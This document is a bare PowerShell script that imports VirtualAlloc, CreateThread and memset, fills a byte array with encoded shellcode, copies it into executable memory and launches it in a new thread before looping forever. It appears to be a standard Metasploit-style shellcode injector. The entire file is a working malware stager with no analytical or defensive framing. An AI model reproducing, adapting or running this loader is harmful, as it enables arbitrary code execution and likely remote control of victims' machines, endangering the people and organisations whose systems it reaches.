
$PCsJ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PCsJ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9c,0xec,0x9e,0xc2,0xd9,0xea,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x55,0x13,0x03,0x55,0x13,0x83,0xed,0x60,0x0e,0x6b,0x3e,0x70,0x4d,0x94,0xbf,0x80,0x32,0x1c,0x5a,0xb1,0x72,0x7a,0x2e,0xe1,0x42,0x08,0x62,0x0d,0x28,0x5c,0x97,0x86,0x5c,0x49,0x98,0x2f,0xea,0xaf,0x97,0xb0,0x47,0x93,0xb6,0x32,0x9a,0xc0,0x18,0x0b,0x55,0x15,0x58,0x4c,0x88,0xd4,0x08,0x05,0xc6,0x4b,0xbd,0x22,0x92,0x57,0x36,0x78,0x32,0xd0,0xab,0xc8,0x35,0xf1,0x7d,0x43,0x6c,0xd1,0x7c,0x80,0x04,0x58,0x67,0xc5,0x21,0x12,0x1c,0x3d,0xdd,0xa5,0xf4,0x0c,0x1e,0x09,0x39,0xa1,0xed,0x53,0x7d,0x05,0x0e,0x26,0x77,0x76,0xb3,0x31,0x4c,0x05,0x6f,0xb7,0x57,0xad,0xe4,0x6f,0xbc,0x4c,0x28,0xe9,0x37,0x42,0x85,0x7d,0x1f,0x46,0x18,0x51,0x2b,0x72,0x91,0x54,0xfc,0xf3,0xe1,0x72,0xd8,0x58,0xb1,0x1b,0x79,0x04,0x14,0x23,0x99,0xe7,0xc9,0x81,0xd1,0x05,0x1d,0xb8,0xbb,0x41,0xd2,0xf1,0x43,0x91,0x7c,0x81,0x30,0xa3,0x23,0x39,0xdf,0x8f,0xac,0xe7,0x18,0xf0,0x86,0x50,0xb6,0x0f,0x29,0xa1,0x9e,0xcb,0x7d,0xf1,0x88,0xfa,0xfd,0x9a,0x48,0x03,0x28,0x36,0x4c,0x93,0x13,0x6f,0x4e,0xd7,0xfc,0x72,0x4f,0x30,0xf2,0xfb,0xa9,0x6e,0x5c,0xac,0x65,0xce,0x0c,0x0c,0xd6,0xa6,0x46,0x83,0x09,0xd6,0x68,0x49,0x22,0x7c,0x87,0x24,0x1a,0xe8,0x3e,0x6d,0xd0,0x89,0xbf,0xbb,0x9c,0x89,0x34,0x48,0x60,0x47,0xbd,0x25,0x72,0x3f,0x4d,0x70,0x28,0xe9,0x52,0xae,0x47,0x15,0xc7,0x55,0xce,0x42,0x7f,0x54,0x37,0xa4,0x20,0xa7,0x12,0xbf,0xe9,0x3d,0xdd,0xd7,0x15,0xd2,0xdd,0x27,0x40,0xb8,0xdd,0x4f,0x34,0x98,0x8d,0x6a,0x3b,0x35,0xa2,0x27,0xae,0xb6,0x93,0x94,0x79,0xdf,0x19,0xc3,0x4e,0x40,0xe1,0x26,0x4f,0xbc,0x34,0x0e,0x25,0xac,0x84;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$1p3i=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($1p3i.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$1p3i,0,0,0);for (;;){Start-sleep 60};

